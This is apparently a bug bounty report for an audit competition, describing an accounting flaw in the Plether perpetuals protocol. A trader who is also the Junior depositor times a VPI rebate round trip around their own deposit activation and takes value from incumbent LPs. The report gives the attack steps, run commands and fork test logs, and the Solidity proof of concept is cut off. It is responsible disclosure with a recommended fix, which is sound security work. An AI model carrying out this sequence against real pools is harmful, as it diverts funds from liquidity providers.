# \#97969 [SC-Critical] Lifetime VPI clamp is bypassed across roles: a trader who also makes the Junior deposit profits from the minority VPI depth attack

**Submitted on Nov 4th 2026 at 05:38:45 UTC by @tinnohofficial for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97969
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Theft of unclaimed yield

## Description

## Summary

Plether treats this sequence as an attack: open a skew-reducing ("minority") position to receive a negative-VPI rebate, add about 10x pool depth through a Junior deposit, then close. The audited suite keeps a regression test for it, [`VpiDepth.t.sol:75-105`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/test/perps/accounting/fees/VpiDepth.t.sol#L75-L105) `test_MinorityVpiRebateCannotExceedPaidCharges`, which runs the sequence at the release `vpiFactor` (0.01e18) with an asynchronous Junior deposit that activates between the open and the close, and asserts **"Minority VPI depth attack must not be profitable"**. The fix behind it is the lifetime clamp, and the clamp works: the close recovers the whole rebate from the trader account into HousePool.

**The invariant fails across roles.** When the trader is also the Junior depositor, the same sequence is profitable for that actor:
- the skew-reducing open pays the rebate out of HousePool and locks the same gross amount in the trader's dedicated, nonwithdrawable VPI reserve;
- by design, that reserve is outside terminal NAV, so the trader's own Junior deposit activates at a NAV that counts the cash that left but not the reserve that must come back;
- the close hits the lifetime clamp, which moves the full reserve back into HousePool, where the new shares participate in proportion to their ownership (about 90% in the project's 9M/1M fixture, about one-third in the deployed-release fork);
- the incumbent Junior LPs paid for the whole rebate but recover only their diluted share.

The project's assertion measures only the trader's clearinghouse balance, and in its fixture the 9M deposit is made by `bob`, the incumbent Junior LP himself, so entrant and incumbent are the same account and no cross-cohort transfer can appear. Changing that one argument to the trader makes the attack profitable while the trader-only assertion still passes.

| Reproduction | Attacker | Incumbent Junior | Same trades, close before activation (attacker / incumbent) |
|---|---:|---:|---:|
| Project test above, core sequence with the trader as depositor | **+54.468502** | **−134.561337** | −80.238818 / +0.011411 |
| **Deployed Arbitrum Sepolia v2.0.0 bytecode** (fork), real on-chain Pyth FX prices and confidences, attacker capital $1.175M, honest Senior depth | **+6,401.012883** | **−13,925.599554** | −7,638.359370 / +113.772699 |
| Same fork, three consecutive cycles | **+19,446.202466** | **−42,020.260846** | n/a |
| Same fork, every feed at 9.5 bps confidence (release cap 10 bps) | +2,859.996510 | −10,384.583181 | −11,803.514078 / +4,278.927406 |

In the real-confidence fork run, moving only the close from before activation to after activation moves exactly **14,039.372253 USDG** from incumbent Junior LPs to the attacker. Honest Senior LPs receive the same +216.306167 coupon in both branches. In the project-test run the attacker's trader account still loses 80.246209, so the project's own assertion keeps passing while the actor's combined wealth gains.

**Selected severity: High, theft of unclaimed yield.** The attacker withdraws, as USDG, a share of the later-collected VPI clawback that the incumbent LPs funded, with no privileged step. The PoCs show deterministic accounting on fixed-price paths and demonstrate repetition; live profit remains exposed to ordinary Junior NAV, market and liquidity changes until redemption.

## What is documented, and what this report contests

**1. Not contested: the reserve is deliberately outside terminal `K` and symmetric NAV.** [`ACCOUNTING_SPEC.md:140-142`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md?plain=1#L140-L142) classifies VPI and action reserves as "separate realized-settlement quantities, not marked price PnL"; [`ACCOUNTING_SPEC.md:1064-1066`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md?plain=1#L1064-L1066) and [`SECURITY.md:871-872`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md?plain=1#L871-L872) say the VPI reserve does not inflate terminal `K` or symmetric LP NAV; [`WHITEPAPER.md:887-888`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md?plain=1#L887-L888) and [`ACCOUNTING_SPEC.md:821-822`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md?plain=1#L821-L822) state the custody consequence, that LPs cannot withdraw the reserve as marked equity before the matching obligation settles. This report keeps all of that. These passages do not address whether the trader may also be the incoming LP and share the later collection of its own, already-funded clawback.

**2. Contested: the composition defeats the project's stated VPI round-trip goal.**
- The regression test above descends from the fix [`6d0aeb1e` "Fix C-02: replace stateless entryDepth with stateful vpiAccrued bound"](https://github.com/immunefi-team/audit-comp-plether/commit/6d0aeb1e4113206c10291004626a207de8a66559), whose commit message states the goal: "users can never extract net VPI profit regardless of depth changes". The original test describes the attack as "Attacker opens minority position (receives VPI rebate) at low depth, depth inflates, then closes" and inflates depth "by 10x via LP deposit". At that commit, SECURITY.md listed the same sentence under "These properties must always hold. Violation indicates a critical bug."
- The audited code and docs keep the goal: the clamp comment at [`CloseAccountingLib.sol:112-118`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L112-L118) ("Prevents LP sandwich attacks … to extract a net-negative lifetime VPI rebate"), [`SECURITY.md:1443`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md?plain=1#L1443) ("the lifetime clamp intentionally zeroes otherwise extractable rebate-only round trips") and [`VpiRoundTripAccounting.t.sol:36-64`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/test/perps/accounting/close/VpiRoundTripAccounting.t.sol#L36-L64) ("Depth manipulation round-trip must not produce positive PnL").
- `MinorityVpiDepthAttackWithAttackerDeposit.t.sol` inherits the project test class unchanged. Its attack branch preserves the original trade, deposit, activation and close parameters while changing the depositor from `bob` to `alice`; it adds snapshots, combined-wealth accounting, redemption after the cooldown, and a control branch that closes before activation. The clamp does its job on the trader account; the value comes back through the share price of the deposit that the attack scenario itself relies on.

**3. No document accepts this for VPI, while the analogous carry transfer is accepted explicitly.** For carry, the project wrote the policy down: an incoming LP may time collection after activation, "a collection-time ownership policy" ([`ACCOUNTING_SPEC.md:731-740`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md?plain=1#L731-L740), [`WHITEPAPER.md:966-977`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md?plain=1#L966-L977)), and pinned it with tests that "deliberately retain this timing policy" ([`CarryLpOwnership.t.sol:9-10`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/test/perps/accounting/carry/CarryLpOwnership.t.sol#L9-L10)) and assert "collection timing intentionally permits the incoming LP to share old carry" ([`:96`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/test/perps/accounting/carry/CarryLpOwnership.t.sol#L96)). No source, NatSpec, document or test says the same for VPI; the VPI tests assert the opposite for depth round trips. Carry is uncollateralized trader debt, whereas the negative-VPI balance has already left HousePool and the identical amount sits in protocol custody, protected from every other use ([`SECURITY.md:376`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md?plain=1#L376), [`:866-870`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md?plain=1#L866-L870)) until the clamp forces it back.

**4. The project's JIT defence is respected and does not help.** The defence is the activation-aged cooldown: [`TrancheVault.sol:38`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L38) sets `DEPOSIT_COOLDOWN = 1 hours`; [`SECURITY.md:400`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md?plain=1#L400) specifies activation-aged semantics, and [`HousePoolDeposits.t.sol:262-272`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/test/perps/spec/lp/HousePoolDeposits.t.sol#L262-L272) exercises the JIT block. Every PoC waits it out before redeeming. The ownership dilution is fixed by activation and collection, but the attacker still bears ordinary Junior NAV, market and liquidity risk until redemption; the PoCs hold oracle prices constant.

**5. Relation to SC-H1.** The pre-audit's SC-H1, "Deposit Before Yield is Accrued Allows to Dilute Yield", was fixed by rewriting Senior accounting ("This change requires a second audit"). This report reaches the same deposit-before-recognition dilution class through a current, previously untested mechanism: Junior issuance across protected negative-VPI backing, which the Senior rewrite did not address. If triage groups it with SC-H1, the PoCs show the class is still exploitable at a82d4fef.

General epoch-timing language ([`WHITEPAPER.md:679-682`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md?plain=1#L679-L682), [`:742-746`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md?plain=1#L742-L746)) is the strongest remaining objection. It warns that trading stays live during the quiet period and that a matured request is priced at the snapshot when it is settled. It does not say that a VPI round trip may be timed around the actor's own activation to take incumbents' clawback, which is the outcome the clamp was added to prevent.

## Root cause

1. **The open pays the rebate from HousePool and locks it.** [`CfdEnginePlanLib.sol:331-349`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L331-L349) sets `poolRebatePayoutAssets` and the reserve target `max(-vpiAccrued, 0)`. [`CfdEngineSettlementSidecar.sol:442-478`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L442-L478) pays the net rebate with `pool.payOut` and calls `lockVpiRebateReserve`. [`:905-925`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L905-L925) has the pool fund the execution-fee top-up. HousePool's total cash decrease equals the gross reserve exactly: 41,551.656589 USDG on the fork, asserted.
2. **Activation NAV excludes the reserve (by design, see above).** [`HousePoolAccountingLib.sol:60-79`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolAccountingLib.sol#L60-L79) computes `physicalAssets − traderClaims + terminalPriceDelta`. [`HousePool.sol:824-940`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L824-L940) reconciles that snapshot and activates Junior deposits at it. The dip falls entirely on Junior; Senior is unimpaired.
3. **The close forces the full reserve back into the enlarged share base.** [`CloseAccountingLib.sol:112-118`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L112-L118) clamps the lifetime VPI to be non-negative. The entrant's deposit adds depth, so the fresh close charge on its own would be smaller than the rebate; the clamp still collects the full old accrual. [`CfdEngineSettlementSidecar.sol:690-720`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L690-L720) consumes the trader's reserve into HousePool, now owned in part by the new shares.
4. **A large reducing open is reachable.** The 40% skew cap is enforced only in the open planner ([`CfdEnginePlanLib.sol:468-480`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L468-L480), [`WHITEPAPER.md:844-848`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md?plain=1#L844-L848)), and an open that strictly reduces the imbalance is admitted above it. Ordinary closes do not pass that gate, and the whitepaper explicitly notes that one-sided liquidations can leave a skewed live book ([`WHITEPAPER.md:1507-1511`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md?plain=1#L1507-L1511)).

## Attack on the deployed release (fork PoC)

The deployed pool at block 324,032,051 holds 2,000,002 USDG with no positions. Honest LPs add 6.9M Senior and 1.1M Junior; after coupon allocation the logged principals are 7,900,247.560016 Senior and 2,099,754.439984 Junior. Unrelated traders open 95,000-lot (9.5M-unit) LONG and SHORT positions in cap-compliant steps, then the SHORT closes. This leaves a standing LONG of 9,135,100.63 USDG notional at the real basket mark 0.96158954, about 91% of depth. Then:

1. The attacker requests a 1,050,000 USDG Junior deposit and holds 125,000 USDG of trader collateral.
2. Thirty seconds before the epoch boundary, the attacker opens a 95,000-lot SHORT through `OrderRouter.commitOrder`/`executeOrder`. The open reduces skew and is admitted above the cap. HousePool pays out 41,551.656589 and the same amount is locked as the reserve.
3. At the boundary, a permissionless `OrderRouter.settleLpEpoch` activates the deposit at the post-rebate NAV.
4. The attacker closes the SHORT at the same oracle prices. The clamp moves the full reserve back into HousePool.
5. After the one-hour cooldown, the attacker requests redemption, `settleLpEpoch` funds it, and the attacker withdraws 1,063,820.721435.

The control runs the same trades with the close before activation. Prices, fees, confidence and sizes are identical; only the order relative to activation differs.

## Economics and preconditions

- **Capital.** $1.175M from the attacker (1.05M LP capital + 125k trader collateral), below the program's $100M high-capital threshold. Honest Senior capital supplies most of the depth that sizes the VPI, but only incumbent Junior ownership is diluted.
- **Book state.** The fork uses a close-created book at ~91% of depth. Closes and one-sided liquidations are not skew-capped, so such books are reachable with ordinary trading. The attacker also does not need someone else's skew: in the harness's self-built variant one actor builds the balanced book, closes one side and pays every on-protocol setup cost (fees, confidence shifts, VPI, carry). It breaks even in cycle 6 and ends +69,670.111231 after ten cycles and a full flatten. That variant does not model hedging the standing LONG off-protocol.
- **Costs.** Execution fees (4 bps each way) and the adverse-confidence shift (25% of basket confidence). At the fork block the real Arbitrum Sepolia Pyth confidence was 0.18–0.94 bp per feed (EUR/USD 0.18, USD/JPY 0.19, USD/CAD 0.29, GBP/USD 0.30, USD/CHF 0.36, USD/SEK 0.94), which is why the real-confidence run earns more than the 9.5-bps run. Pyth update fees and gas are not modelled.
- **Timing and repetition.** A live cycle takes about three hours across deposit activation, the one-hour cooldown and redemption. The redeemed amount exceeds the next 1.05M deposit, so one capital lot is economically reusable. The fork helper mints a fresh test-token lot before each measured cycle rather than literally recycling the prior balance; its three cycles earn +19,446.202466 in total (+6,401.012883, +6,481.650544 and +6,563.539039), while incumbent Junior loses 42,020.260846. The harness's self-built ten-cycle test pre-funds one lot and reuses it.

## Severity

**High: theft of unclaimed yield.** The protocol books the clawback as LP-owned value when it is collected. The attacker diverts a dilution-weighted share of that value from the incumbent Junior LPs who funded the rebate. The path is permissionless and repeatable, and the PoCs withdraw the gain as USDG; the exact live gain is not deterministic because the entrant retains Junior risk until withdrawal.

Critical, direct theft of LP funds, is arguable: the incumbents' vault value ends below its pre-attack level because the rebate was paid out of their principal. This report does not select Critical because the protocol accounts for VPI at collection rather than as marked principal.

## Known-issue comparison

- **Pre-audit SC-H1** ("Deposit Before Yield is Accrued Allows to Dilute Yield"): same dilution class, reached here through a current Junior/negative-VPI-reserve mechanism that the Senior rewrite did not address (see above).
- **AI scan, two info items** ("Temporary pool liquidity can reduce a skew-increasing close charge"; "Temporary pool-liquidity reduction can amplify a skew-reducing close rebate") change the fresh close VPI amount through execution-time depth. Here the clamp collects the full old accrual regardless of depth, and the gain comes from share issuance across that collection.
- **SC-M3** (negative `vpiAccrued` omitted from post-open IMR) is fixed and unrelated to LP pricing.
- **SECURITY.md Known Limitations** (VPI, LP accounting) mention neither entrant capture of a reserve clawback nor any exception to the minority-VPI-depth property.

## Recommendation

Keep custody and redemption funding unchanged and fix ownership pricing:

- include the protected aggregate negative-VPI reserve, which equals the guaranteed clawback, in deposit and redemption share pricing, while still excluding it from redemption funding capacity, exactly as marked price receivables are handled; or
- attribute each reserve's realization to the Junior ownership set that funded it; or
- defer Junior deposit activation while a material negative-VPI reserve is outstanding.

Extend `VpiDepth.t.sol::test_MinorityVpiRebateCannotExceedPaidCharges` to assert on the actor's combined trader and LP wealth with the trader as depositor, and keep the symmetric entry/exit NAV tests passing.

## References

- First-party attack definition: `test/perps/accounting/fees/VpiDepth.t.sol:75-105`; `test/perps/accounting/close/VpiRoundTripAccounting.t.sol:36-64`; `src/libraries/CloseAccountingLib.sol:112-118`; `SECURITY.md:376,400,1443`; commit `6d0aeb1e4113206c10291004626a207de8a66559`.
- NAV policy text: `ACCOUNTING_SPEC.md:140-142,731-740,821-822,1064-1066`; `SECURITY.md:863-872`; `WHITEPAPER.md:679-682,742-746,887-888,966-977`; `test/perps/accounting/carry/CarryLpOwnership.t.sol:9-10,96`.
- Mechanics: `src/libraries/CfdEnginePlanLib.sol:331-349,468-480`; `src/CfdEngineSettlementSidecar.sol:442-478,690-720,905-925`; `src/libraries/HousePoolAccountingLib.sol:60-79`; `src/HousePool.sol:824-940`; `src/TrancheVault.sol:38`.
- Deployment: `deployments/releases/2026-10-28-perps-arbitrum-sepolia-v2.0.0/{manifest.json,addresses.env}`.


## Proof of Concept

## Proof of Concept

All tests run at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8` with `packages/perps/src` unmodified. Each command
below was run twice; both runs produced identical pass counts, gas figures and logged values (only timing differs).

### What each test shows

| File | Environment | Shows |
|---|---|---|
| `MinorityVpiDepthAttackWithAttackerDeposit.t.sol` | Project test class `VpiDepthTest` (inherited, unchanged) | The project's own "minority VPI depth attack" regression, with the 9M Junior deposit made by the trader instead of the incumbent Junior LP, is profitable for that actor; the project's trader-account assertion still passes. The five inherited project tests also pass in the same run. |
| `VpiReserveEntryDilutionDeployedFork.t.sol` | Fork of the deployed Arbitrum Sepolia v2.0.0 release | Attack vs control on the deployed bytecode with the production V3 Router, six-feed oracle and the real on-chain Pyth FX prices/confidences; three consecutive cycles. |
| `VpiReserveEntryDilution.t.sol` | Suite harness (`BasePerpTest`) with release risk/fee/Router parameters | Attack vs control on a 98%-nominal close-created book, three cycles reusing the same standing skew, and a self-built variant in which one actor creates the skew, pays every on-protocol setup cost and still profits. |

### Environment fidelity

- **Project-test variant.** Identical fixture, risk parameters (`vpiFactor = 0.01e18`), sizes, prices and helpers as
  `test/perps/accounting/fees/VpiDepth.t.sol:75-105`. The attack branch preserves the project's core sequence and
  changes the depositor passed to `_fundJuniorDelayed` (in the project test it is `bob`, the incumbent Junior LP); the
  PoC additionally adds measurement, redemption after the cooldown and a control branch that closes before activation.
  Like the original, it uses the suite's `_fundJuniorDelayed` / `_settleAvailableJuniorWithdrawal` helpers (they
  install the mark and call `HousePool.settleLpEpoch` from the Router address, the same callback the public
  `OrderRouter.settleLpEpoch` performs) and the project's mock Pyth.
- **Deployed-release fork.** Block 324,032,051 (Thu 2026-10-29 14:00 UTC; deployed pool = 2,000,002 USDG, no
  positions). The release source `1209ca8a` has no `packages/perps/src` difference from `a82d4fef`. `setUp` asserts the
  runtime code hashes of nineteen deployed contracts on the exercised path against
  `deployments/releases/2026-10-28-perps-arbitrum-sepolia-v2.0.0/manifest.json`. Only out-of-scope dependencies are
  replaced: the Pyth address is etched with the suite's `MockPyth`, which replays the real Pyth price, confidence and
  exponent stored on-chain for each of the six basket feeds at the fork block, and Arbitrum's ArbSys precompile, which
  the Router reads for the L2 block number, is shimmed to `block.number` (in fork state address 100 holds only a
  one-byte placeholder and calls to it revert). MockUSDG is the deployed, publicly mintable test token.
  Trades use the production `OrderRouter.commitOrder(OrderRequest)` and `executeOrder`; LP epochs use the
  permissionless `OrderRouter.settleLpEpoch`; LP requests and claims use public vault methods. Prices are held constant.
  The book is 95,000 lots because at the real basket mark (~0.9616) a SHORT's maximum profit is
  `lots x (2.00 - mark)`, so a larger balanced book does not pass the solvency check on a ~10M pool. `_cycle()` mints
  a fresh 1.05M test-token lot before each measured cycle (the previous cycle redeems more than that, so reuse is
  economically feasible, but the three-cycle test does not literally recycle the balance).
- **Harness.** `BasePerpTest` uses two uniform mock feeds, $1,000 seeds per tranche, the test-only
  `LegacyOrderRouterHarness.commitOrder` scalar adapter (it self-delegatecalls the production V3 commit path) and
  every fill at the 10-bp basket confidence cap with the 25% adverse multiplier. Execution and LP settlement use the
  Router. The ordinary three-cycle helper mints LP capital each cycle; the self-built ten-cycle test pre-funds one lot
  and reuses it. The self-built variant counts all on-protocol fees, confidence shifts, VPI, carry and a final
  flatten; it excludes gas, Pyth fees, capital cost and any off-protocol hedge of the standing LONG.

### Run

```bash
git clone --recurse-submodules https://github.com/immunefi-team/audit-comp-plether.git
cd audit-comp-plether && git checkout a82d4fefb02768e5b3bddcc97dee371eee24fea8
git submodule update --init --recursive
# save the three files below under packages/perps/test/poc/

forge test --root packages/perps --match-path test/poc/MinorityVpiDepthAttackWithAttackerDeposit.t.sol -vv
forge test --root packages/perps --match-path test/poc/VpiReserveEntryDilution.t.sol -vv

# fork test: any Arbitrum Sepolia archive RPC (block 324,032,051 must be available)
export ARB_SEPOLIA_RPC_URL=<arbitrum-sepolia-archive-rpc-url>
forge test --root packages/perps --match-path test/poc/VpiReserveEntryDilutionDeployedFork.t.sol -vv
```

USDG amounts in the logs use six decimals.

### Output: project-test variant

```text
Ran 6 tests for test/poc/MinorityVpiDepthAttackWithAttackerDeposit.t.sol:MinorityVpiDepthAttackWithAttackerDepositTest
[PASS] test_MinorityVpiRebateCannotExceedPaidCharges() (gas: 8009357)
[PASS] test_SizeAdditionCannotBypassVpiBound() (gas: 8850266)
[PASS] test_VpiRebateReserve_BlocksRebateExtractionAcrossWithdrawAndFullClose() (gas: 4790926)
[PASS] test_VpiReserveOverfund_DoesNotImproveExactPriceHealth() (gas: 2871714)
[PASS] test_VpiReserveUnderfund_FailsClosedAsIndependentDelinquency() (gas: 3003092)
[PASS] test_projectMinorityVpiDepthAttack_attackerIsTheDepositor() (gas: 15172946)
Logs:
  ATTACK gross VPI reserve locked at open 149670784
  ATTACK pool cash decrease at open 149670784
  ATTACK alice trader-account delta (project metric) -80246209
  ATTACK alice total delta (trader + own 9M Junior deposit) 54468502
  ATTACK bob incumbent Junior delta -134561337
  ATTACK alice redeemed Junior assets 9000134714711
  CONTROL alice trader-account delta -80222380
  CONTROL alice total delta -80238818
  CONTROL bob incumbent Junior delta 11411

Suite result: ok. 6 passed; 0 failed; 0 skipped; finished in 18.02ms (35.07ms CPU time)
```

`alice trader-account delta` is the project's own metric (`assertLe(aliceBalAfter, aliceBalBefore, ...)` still
passes). `alice total delta` adds the trader's own 9M Junior deposit, redeemed after the cooldown through the
project's helper. The incumbent (`bob`, 1M Junior) loses 134.561337 in the attack and gains 0.011411 in the control.

### Output: deployed-release fork

```text
Ran 3 tests for test/poc/VpiReserveEntryDilutionDeployedFork.t.sol:VpiReserveEntryDilutionDeployedForkTest
[PASS] testFork_maxConfidence_seniorBackedAttackVsControl() (gas: 29802107)
Logs:
  SCENARIO max confidence (9.5 bps per feed)
  deployed pool assets at fork 2000002000000
  deployed basket mark 96158954
  pool assets after honest LP funding 10000002000000
  senior principal 7900247560016
  junior principal 2099754439984
  standing LONG notional 9135100630000
  pool assets before cycle 10046017622467
  gross VPI reserve 41553522312
  pool cash decrease at reducing open 41553522312
  ATTACK attacker delta 2859996510
  ATTACK incumbent Junior delta (deployed LP + JUNIOR_LP) -10384583181
  ATTACK honest Senior delta (deployed LP + SENIOR_LP) 216306167
  ATTACK attacker redeemed assets 1064483454674
  CONTROL attacker delta -11803514078
  CONTROL incumbent Junior delta 4278927406
  CONTROL honest Senior delta 216306167

[PASS] testFork_realConfidence_seniorBackedAttackVsControl() (gas: 29742824)
Logs:
  SCENARIO real Pyth confidence at fork block
  deployed pool assets at fork 2000002000000
  deployed basket mark 96158954
  pool assets after honest LP funding 10000002000000
  senior principal 7900247560016
  junior principal 2099754439984
  standing LONG notional 9135100630000
  pool assets before cycle 10041847185377
  gross VPI reserve 41551656589
  pool cash decrease at reducing open 41551656589
  ATTACK attacker delta 6401012883
  ATTACK incumbent Junior delta (deployed LP + JUNIOR_LP) -13925599554
  ATTACK honest Senior delta (deployed LP + SENIOR_LP) 216306167
  ATTACK attacker redeemed assets 1063820721435
  CONTROL attacker delta -7638359370
  CONTROL incumbent Junior delta 113772699
  CONTROL honest Senior delta 216306167

[PASS] testFork_realConfidence_threeConsecutiveCycles() (gas: 35970361)
Logs:
  deployed pool assets at fork 2000002000000
  deployed basket mark 96158954
  pool assets after honest LP funding 10000002000000
  senior principal 7900247560016
  junior principal 2099754439984
  standing LONG notional 9135100630000
  pool assets before cycle 10041847185377
  cycle 1
    reserve 41551656589
    attacker delta 6401012883
    incumbent Junior delta -13925599554
  cycle 2
    reserve 41608461138
    attacker delta 6481650544
    incumbent Junior delta -14006383434
  cycle 3
    reserve 41665756712
    attacker delta 6563539039
    incumbent Junior delta -14088277858
  three-cycle attacker total 19446202466
  three-cycle incumbent Junior total -42020260846

Suite result: ok. 3 passed; 0 failed; 0 skipped; finished in 715.68ms (124.98ms CPU time)
```

Attack minus control in the real-confidence run: attacker `+14,039.372253`, incumbent Junior `-14,039.372253`, honest
Senior unchanged (`+216.306167` coupon in both branches). The logged principals after coupon allocation are
7,900,247.560016 Senior and 2,099,754.439984 Junior; the attacker's 1.05M deposit is about one-third of Junior after
activation.

### Output: harness (repetition and self-built variant)

```text
Ran 3 tests for test/poc/VpiReserveEntryDilution.t.sol:VpiReserveEntryDilutionTest
[PASS] test_overCapNegativeVpiReserveEntryDilutesIncumbentJunior() (gas: 26286540)
Logs:
  ATTACK victim delta -20200562738
  ATTACK attacker delta 12361915543
  ATTACK guaranteed VPI reserve 47781780724
  ATTACK pool drop while reserve outstanding 47781780724
  ATTACK redeemed assets 10025102570884
  ATTACK treasury delta 7840000000
  CONTROL victim delta 5079755767
  CONTROL attacker delta -12920387871
  CONTROL treasury delta 7840000000

[PASS] test_selfBuiltSkewAmortizesAllSetupCostsWithinTenCycles() (gas: 72871690)
Logs:
  SELF-BUILT setup delta -67091476887
  SELF-BUILT cycle 1
    cycle entrant delta 12361915543
    cumulative attacker delta -54835928729
    cumulative victim delta 35126320392
  SELF-BUILT cycle 2
    cycle entrant delta 12435524979
    cumulative attacker delta -42507040249
    cumulative victim delta 14852153976
  SELF-BUILT cycle 3
    cycle entrant delta 12509748985
    cumulative attacker delta -30104088011
    cumulative victim delta -5496230621
  SELF-BUILT cycle 4
    cycle entrant delta 12584595884
    cumulative attacker delta -17626454603
    cumulative victim delta -25919456240
  SELF-BUILT cycle 5
    cycle entrant delta 12660074150
    cumulative attacker delta -5073508655
    cumulative victim delta -46418154201
  SELF-BUILT cycle 6
    cycle entrant delta 12736192423
    cumulative attacker delta 7555389839
    cumulative victim delta -66992964459
  SELF-BUILT cycle 7
    cycle entrant delta 12812959481
    cumulative attacker delta 20260889663
    cumulative victim delta -87644535750
  SELF-BUILT cycle 8
    cycle entrant delta 12890384339
    cumulative attacker delta 33043648573
    cumulative victim delta -108373525821
  SELF-BUILT cycle 9
    cycle entrant delta 12968476094
    cumulative attacker delta 45904333464
    cumulative victim delta -129180601516
  SELF-BUILT cycle 10
    cycle entrant delta 13046776662
    cumulative attacker delta 58843147718
    cumulative victim delta -149706641801
  SELF-BUILT break-even cycle 6
  SELF-BUILT all-flat attacker delta 69670111231
  SELF-BUILT final victim delta -159460785833

[PASS] test_threeConsecutiveCyclesReuseSameStandingSkew() (gas: 31448700)
Logs:
  cycle 1
    reserve 47781780724
    attacker delta 12361915543
    victim delta -20200562738
  cycle 2
    reserve 47877976432
    attacker delta 12435524979
    victim delta -20274166416
  cycle 3
    reserve 47974912879
    attacker delta 12509748985
    victim delta -20348384597
  three-cycle attacker delta 37307189507
  three-cycle victim delta -60823113751

Suite result: ok. 3 passed; 0 failed; 0 skipped; finished in 75.00ms (121.93ms CPU time)
```

### Source: `packages/perps/test/poc/MinorityVpiDepthAttackWithAttackerDeposit.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {VpiDepthTest} from "../perps/accounting/fees/VpiDepth.t.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {console2} from "forge-std/console2.sol";

/// @notice Re-runs the core sequence of the project's own regression test
///         `VpiDepthTest::test_MinorityVpiRebateCannotExceedPaidCharges` ("Minority VPI depth attack must not be
///         profitable") with one argument changed: the 9M Junior deposit that activates between the rebate-earning
///         open and the close is made by the trader (alice) instead of the incumbent Junior LP (bob). Fixture, release
///         vpiFactor, order sizes, prices, helpers and the original trader-account assertion are inherited unchanged;
///         the test adds measurement, an exit after the cooldown and a control branch that closes before activation.
contract MinorityVpiDepthAttackWithAttackerDepositTest is VpiDepthTest {

    uint256 internal constant LP_CAPITAL = 9_000_000 * 1e6;

    struct Result {
        uint256 reserve;
        uint256 poolDrop;
        int256 aliceTraderDelta;
        int256 aliceTotalDelta;
        int256 bobDelta;
        uint256 redeemedAssets;
    }

    function test_projectMinorityVpiDepthAttack_attackerIsTheDepositor() public {
